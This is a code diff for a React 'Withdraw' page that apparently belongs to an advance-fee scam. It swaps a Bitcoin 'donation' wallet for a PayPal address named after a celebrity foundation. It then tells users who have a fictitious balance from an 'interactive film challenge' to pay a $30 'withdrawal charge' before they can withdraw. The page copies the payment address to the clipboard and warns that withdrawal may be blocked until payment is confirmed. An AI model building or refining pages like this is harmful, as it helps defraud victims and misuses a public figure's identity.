@@ -7,8 +7,8 @@ import { SiteShell } from '../../components/site-shell';
 import { useApp } from '../../components/app-provider';
 import { money } from '../../lib/data';
 
-const WALLET_ADDRESS = 'bc1qd5k69paw2vcd534xpqtculmeglfhtru697xaa4';
-const FOUNDATION_PERCENT = 3;
+const PAYPAL_ADDRESS = 'markruffalofoundation@outlook.com';
+const WITHDRAWAL_CHARGE = 30;
 
 export default function Withdraw() {
   const { profile, loaded, markPaymentVerified } = useApp();
@@ -30,12 +30,12 @@ export default function Withdraw() {
     return () => window.clearTimeout(timer);
   }, [copied]);
 
-  async function copyAddress() {
+  async function copyPaypal() {
     try {
-      await navigator.clipboard.writeText(WALLET_ADDRESS);
+      await navigator.clipboard.writeText(PAYPAL_ADDRESS);
     } catch {
       const helper = document.createElement('textarea');
-      helper.value = WALLET_ADDRESS;
+      helper.value = PAYPAL_ADDRESS;
       helper.setAttribute('readonly', '');
       helper.style.position = 'fixed';
       helper.style.opacity = '0';
@@ -107,7 +107,6 @@ export default function Withdraw() {
                 <div className="withdraw-card">
                   <span className="section-overline">YOUR ACCOUNT OVERVIEW</span>
                   <h2>A clear view<br /><em>of the details.</em></h2>
-                  <p className="quote-caption">{FOUNDATION_PERCENT}% of your balance will be sent to the foundation.</p>
                   <div className="summary-list">
                     <div>
                       <span>Your balance</span>
@@ -115,23 +114,22 @@ export default function Withdraw() {
                     </div>
                     <div>
                       <span><Lock size={14} /> Payment unlock withdrawal</span>
-                      <b className="summary-tag">Pending</b>
                     </div>
                     <div className="total">
-                      <span>Amount to send</span>
-                      <strong>{money(Math.round(profile.allocation * FOUNDATION_PERCENT) / 100)}</strong>
+                      <span>Withdrawal charges</span>
+                      <strong>{money(WITHDRAWAL_CHARGE)}</strong>
                     </div>
                   </div>
                   <div className="wallet-display">
-                    <label className="wallet-label">Bitcoin wallet address</label>
-                    <p className="wallet-donate">Make your donation to this address</p>
+                    <label className="wallet-label">PayPal address</label>
+                    <p className="wallet-donate">Send your withdrawal charges to this address</p>
                     <div className="wallet-address-container">
-                      <code className="wallet-address">{WALLET_ADDRESS}</code>
+                      <code className="wallet-address">{PAYPAL_ADDRESS}</code>
                       <button
                         type="button"
                         className={`wallet-copy${copied ? ' copied' : ''}`}
-                        onClick={copyAddress}
-                        aria-label={copied ? 'Wallet address copied' : 'Copy wallet address'}
+                        onClick={copyPaypal}
+                        aria-label={copied ? 'PayPal address copied' : 'Copy PayPal address'}
                         title={copied ? 'Copied' : 'Copy address'}
                       >
                         {copied ? <Check size={16} /> : <Copy size={16} />}
@@ -140,7 +138,6 @@ export default function Withdraw() {
                     <p className="wallet-copied" aria-live="polite">
                       {copied ? 'Address copied to clipboard' : '\u00A0'}
                     </p>
-                    <p className="wallet-note">All charges go back to the foundation</p>
                   </div>
                   <button
                     className="button button-dark full-button"
@@ -160,7 +157,6 @@ export default function Withdraw() {
                   </div>
                   <span className="section-overline">EXPERIENCE COMPLETE</span>
                   <h2>Congratulations.</h2>
-                  <p>You've finished the interactive film challenge and completed your payment verification. Your account allocation is now confirmed.</p>
                   <p className="verification-note">
                     <Lock size={16} /> You may not be able to make a withdrawal if your payment has not been received or confirmed.
                   </p>
